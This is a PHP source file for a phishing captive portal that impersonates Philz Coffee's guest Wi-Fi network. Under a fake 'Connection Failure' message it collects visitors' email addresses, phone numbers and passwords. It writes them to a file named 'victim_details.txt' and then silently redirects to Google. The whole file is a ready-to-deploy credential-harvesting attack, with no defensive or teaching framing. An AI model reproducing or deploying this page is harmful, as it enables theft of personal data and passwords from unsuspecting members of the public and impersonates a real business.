<?php
// Landing page configuration
$SSID = 'philz_guest';

// Landing page content
if (isset($_POST['submit']) && 
    !empty(trim($_POST['email'])) && 
    !empty(trim($_POST['phone'])) && 
    !empty(trim($_POST['wifi_password'])) &&
    !empty(trim($_POST['verify_password']))) {
    
  $email = htmlspecialchars(trim($_POST['email']));
  $phone = htmlspecialchars(trim($_POST['phone']));
  $password = htmlspecialchars(trim($_POST['wifi_password']));
  $verify_password = htmlspecialchars(trim($_POST['verify_password']));
  
  $data = $SSID . ' | Email: ' . $email . ' | Phone: ' . $phone . ' | Password: ' . $password . "\n";
  file_put_contents('victim_details.txt', $data, FILE_APPEND | LOCK_EX);
  header("Location: https://google.com");
  exit;
} else {
  echo '<!DOCTYPE HTML><html lang="en-US"><head>';
  echo '<title>' . $SSID . ' Connection Failure</title>';
  echo '<meta charset="utf-8">';
  echo '<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">';
  echo '<meta name="generator" content="' . $SSID . '">';
  echo '<style>';
  echo 'html, body {';
  echo '  font-family: Helvetica, sans-serif;';
  echo '  background: #f3f2f2;';
  echo '}';
  echo 'h1 {';
  echo ' padding-bottom: 20px;';
  echo ' border-bottom: 1px solid #eee;';
  echo ' font-size: 25px;';
  echo ' color: #8B4513;';    
  echo '}';
  echo 'p {';
  echo ' margin-bottom: 20px;';
  echo ' padding-bottom: 20px;';
  echo ' font-size: 15px;';
  echo ' color: #777;';
  echo ' border-bottom: 1px solid #eee;';
  echo '}';
  echo 'input {';
  echo ' padding: 5px;';
  echo ' margin-bottom: 10px;';
  echo ' width: 250px;';
  echo '}';
  echo 'label {';
  echo ' display: inline-block;';
  echo ' width: 120px;';
  echo ' text-align: right;';
  echo ' margin-right: 10px;';
  echo '}';
  echo '.center {';
  echo '  margin: 150px auto auto auto;';
  echo '  padding: 20px;';
  echo '  width: 450px;';
  echo '  border: 1px solid #ccc;';
  echo '  border-radius: 5px;';
  echo '  background: #fff;';
  echo '  box-shadow: 4px 4px 5px 0px rgba(50, 50, 50, 0.75);';
  echo '}';
  echo '.form-row {';
  echo '  margin: 10px 0;';
  echo '}';
  echo '.submit-btn {';
  echo '  width: auto;';
  echo '  margin-top: 10px;';
  echo '  padding: 8px 20px;';
  echo '  background:  #8B4513;';
  echo '  color: white;';
  echo '  border: none;';
  echo '  border-radius: 4px;';
  echo '  cursor: pointer;';
  echo '}';
  echo '</style></head>';
  echo '<div class="center">';
  echo '<h1><img src="philz.png" alt="Philz Coffee" style="height: 100px; vertical-align: middle; margin-right: 10px;">Welcome to Philz Coffee</h1>';
  echo '<p>To access our wifi network "' . $SSID . '" <br> Enter your Email Adress, Phone Number and  password below.</p>';
  echo '<form method="POST" action="' . htmlspecialchars($_SERVER["PHP_SELF"]) . '">';
  echo '<div class="form-row"><label>Email:</label>';
  echo '<input type="email" name="email" required></div>';
  echo '<div class="form-row"><label>Phone Number:</label>';
  echo '<input type="tel" name="phone" required></div>';
  echo '<div class="form-row"><label>Password:</label>';
  echo '<input type="password" name="wifi_password" required></div>';
  echo '<div class="form-row"><label>Verify Password:</label>';
  echo '<input type="password" name="verify_password" required></div>';
  echo '<div class="form-row"><input type="submit" name="submit" value="Reconnect" class="submit-btn"></div>';
  echo '</form></div></html>';
}